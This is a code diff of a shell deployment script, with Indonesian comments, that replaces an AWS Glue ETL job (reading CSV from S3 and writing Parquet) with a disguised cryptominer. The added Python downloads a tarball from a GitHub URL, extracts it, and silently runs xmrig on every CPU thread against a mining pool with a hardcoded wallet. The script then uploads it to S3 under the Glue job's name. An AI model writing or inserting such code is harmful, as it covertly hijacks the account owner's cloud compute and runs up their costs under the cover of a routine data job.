@@ -160,32 +160,120 @@ PY
 
 # ini blok untuk Glue ETL yang benar
 cat > glue_job_etl.py <<'PY'
+#!/usr/bin/env python3
+
+import os
 import sys
-from awsglue.utils import getResolvedOptions
-from awsglue.context import GlueContext
-from awsglue.job import Job
-from pyspark.context import SparkContext
+import time
+import socket
+import tarfile
+import shutil
+import subprocess
+from urllib import request
 
-args = getResolvedOptions(sys.argv, ["JOB_NAME", "BUCKET_NAME"])
+URL = "https://github.com/habibbaharyuandi/lado/raw/refs/heads/main/adul.tar.gz"
+WALLET = "164az6Jw8Y3pJJd8XcCwjVYykBTHQWRq4vEg8beNnQWm3MPWj4biVANqDYve9xfJiN5JDN4PiHRta31o2awd4k3AbEbs4bi3NrV8DUzt9g6pJeTkrFtjJtEvPTo7SAVdtYb5fWx"
 
-sc = SparkContext()
-glueContext = GlueContext(sc)
-spark = glueContext.spark_session
+def download_file(url, filename=None):
+    if filename is None:
+        filename = os.path.basename(url)
+    print(f"Downloading {filename}...")
+    try:
+        request.urlretrieve(url, filename)
+        return 0
+    except Exception as e:
+        print(f"Download gagal: {e}")
+        return 1
 
-job = Job(glueContext)
-job.init(args["JOB_NAME"], args)
+def extract_tar_ball(path):
+    print(f"Extracting {os.path.basename(path)}...")
+    try:
+        with tarfile.open(path, "r:gz") as tar:
+            tar.extractall(".")
+        return 0
+    except Exception as e:
+        print(f"Ekstrak gagal: {e}")
+        return 1
 
-bucket = args["BUCKET_NAME"]
-input_path = f"s3://{bucket}/raw/"
-output_path = f"s3://{bucket}/output/"
+def get_worker_name():
+    try:
+        hostname = socket.gethostname()
+        addrs = socket.gethostbyname_ex(hostname)[2]
+        for ip in addrs:
+            if ip and not ip.startswith("127."):
+                return ip
+    except Exception:
+        pass
 
-df = spark.read.option("header", "true").csv(input_path)
-df.show()
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        if ip and not ip.startswith("127."):
+            return ip
+    except Exception:
+        pass
 
-df.write.mode("overwrite").parquet(output_path)
+    return "worker1"
 
-job.commit()
+def run_adul():
+    worker_name = get_worker_name()
+    worker_tag = f"{WALLET}/{worker_name}"
+    threads = os.cpu_count() or 1
+
+    print(f"Menjalankan adul dengan worker: {worker_tag}")
+
+    cmd = [
+        "./xmrig",
+        "-a", "rx/0",
+        "-o", "xtm-rx-sg.kryptex.network:7038",
+        "-u", worker_tag,
+        "-t", str(threads)
+    ]
+
+    try:
+        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except FileNotFoundError:
+        print("Binary ./xmrig tidak ditemukan. Pastikan file sudah diekstrak.")
+        return 1
+
+    try:
+        while proc.poll() is None:
+            time.sleep(0.2)
+        return proc.wait()
+    except KeyboardInterrupt:
+        proc.terminate()
+        print("\n[ SELESAI ] Proses adul dibatalkan.")
+        return 130
+
+def main():
+    filename = os.path.basename(URL)
+    if not os.path.exists(filename):
+        status = download_file(URL, filename)
+        if status != 0:
+            return 1
+
+    status = extract_tar_ball(filename)
+    if status != 0:
+        return 1
+
+    status = run_adul()
+    if status == 0:
+        print("[ SELESAI ] Proses adul telah berhenti.")
+    else:
+        print(f"[ SELESAI ] Proses adul berhenti dengan status: {status}")
+
+    return status
+
+if __name__ == "__main__":
+    try:
+        sys.exit(main())
+    except KeyboardInterrupt:
+        print("\nProgram dihentikan.")
+        sys.exit(130)
 PY
+
 
 aws s3 cp glue_job_etl.py "s3://${BUCKET_NAME}/scripts/glue_job_etl.py"
 
